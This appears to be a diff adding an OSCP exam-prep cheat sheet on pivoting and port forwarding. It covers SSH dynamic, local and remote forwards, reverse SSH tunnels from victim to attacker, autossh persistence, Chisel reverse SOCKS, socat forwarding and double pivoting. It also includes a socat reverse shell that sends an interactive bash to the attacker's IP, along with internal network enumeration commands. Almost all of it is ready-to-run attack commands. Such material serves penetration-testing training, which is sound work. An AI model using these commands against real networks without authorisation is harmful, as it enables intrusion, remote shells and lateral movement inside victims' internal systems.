@@ -1,0 +1,171 @@
+######################################################################
+# 11 – PIVOTING & PORT FORWARDING (OSCP 2025)
+######################################################################
+
+Pivoting allows you to access internal networks through a compromised host.
+All techniques below are fully OSCP-safe and non-Metasploit.
+
+
+======================================================================
+# 1. SSH Pivoting (Most Important)
+======================================================================
+
+---------------------------------------
+# 1.1 Dynamic SOCKS Proxy (BEST METHOD)
+---------------------------------------
+ssh -D 1080 $user@$pivot
+
+# Use proxychains:
+proxychains nmap -sT -Pn 10.10.2.0/24
+proxychains firefox http://internal-host
+
+
+---------------------------------------
+# 1.2 SSH Local Port Forward (Access Internal Ports)
+---------------------------------------
+ssh -L 13389:10.10.2.20:3389 $user@$pivot
+
+# Connect locally:
+xfreerdp /v:127.0.0.1:13389
+
+
+---------------------------------------
+# 1.3 SSH Remote Port Forward (Expose Local Service to Pivot)
+---------------------------------------
+ssh -R 0.0.0.0:8888:127.0.0.1:80 $user@$pivot
+
+# Now pivot machine can reach your Kali web server at:
+# http://pivot:8888/
+
+
+---------------------------------------
+# 1.4 Reverse SSH Tunnel (When Pivot Can't Be Reached Directly)
+---------------------------------------
+# Run on pivot host (victim → attacker)
+ssh -R 4444:127.0.0.1:22 attacker@$localip
+
+# On attacker (your Kali):
+ssh -p 4444 user@localhost
+
+Useful when firewall blocks inbound traffic to the pivot but allows outbound.
+
+
+---------------------------------------
+# 1.5 autossh – Persistent Tunnels (Auto-Reconnect)
+---------------------------------------
+autossh -M 0 -f -N -D 1080 $user@$pivot
+autossh -M 0 -f -N -L 8080:internal:80 $user@$pivot
+
+# autossh restarts tunnels automatically if they drop.
+# Very useful in OSCP-style unstable labs.
+
+
+======================================================================
+# 2. Chisel Pivoting (Fast & Reliable)
+======================================================================
+
+---------------------------------------
+# 2.1 Start Chisel Server on Kali (Reverse Mode)
+---------------------------------------
+chisel server -p 9001 --reverse
+
+---------------------------------------
+# 2.2 Start Chisel Client on Pivot (Victim → Kali)
+---------------------------------------
+chisel client $localip:9001 R:socks
+
+# Proxychains usage:
+proxychains crackmapexec smb 10.10.2.10
+proxychains nmap -sT 10.10.2.0/24
+
+
+======================================================================
+# 3. Socat (Swiss Army Knife)
+======================================================================
+
+---------------------------------------
+# 3.1 Local → Remote Port Forward
+---------------------------------------
+socat TCP-LISTEN:8080,fork TCP:10.10.2.50:80
+
+# Access internal host:
+curl http://127.0.0.1:8080
+
+
+---------------------------------------
+# 3.2 Reverse Shell With Full TTY
+---------------------------------------
+socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:$localip:4444
+
+
+======================================================================
+# 4. Internal Network Enumeration (Manual Meterpreter Replacement)
+======================================================================
+
+---------------------------------------
+# 4.1 On Linux Pivot Host
+---------------------------------------
+ip a
+route -n
+arp -a
+ss -tulnp
+
+# Fast ping sweep
+fping -a -g 10.10.2.0/24 2>/dev/null
+
+# Nmap from inside pivot
+nmap -sT -p- --min-rate 2000 10.10.2.0/24
+
+
+---------------------------------------
+# 4.2 On Windows Pivot Host
+---------------------------------------
+ipconfig /all
+arp -a
+route print
+netstat -ano
+
+# PowerShell ping sweep
+powershell -c "1..254 | % { Test-Connection -Count 1 10.10.2.$_ }"
+
+# Enumerate SMB from pivot
+powershell -c "Get-SmbShare"
+powershell -c "Test-NetConnection -Port 445 internal_host"
+
+
+======================================================================
+# 5. Double Pivoting (Attack → Pivot1 → Pivot2 → Internal)
+======================================================================
+
+# First pivot
+ssh -D 1080 user@pivot1
+
+# Use proxychains to reach pivot2
+proxychains ssh -D 2080 user@pivot2
+
+# Second layer of proxying (proxychains2)
+proxychains2 nmap -sT 10.10.50.0/24
+
+
+======================================================================
+# 6. Quick Pivoting Cheat-Sheet
+======================================================================
+# SOCKS proxy:
+ssh -D 1080 user@pivot
+
+# Local → internal:
+ssh -L localport:internalhost:port user@pivot
+
+# Internal → attacker:
+ssh -R attackerport:local:port attacker@your-ip
+
+# Chisel:
+chisel client your-ip:9001 R:socks
+
+# Socat:
+socat TCP-LISTEN:port,fork TCP:internal:port
+
+
+######################################################################
+# END OF 11_PIVOTING.TXT (OSCP 2025)
+######################################################################
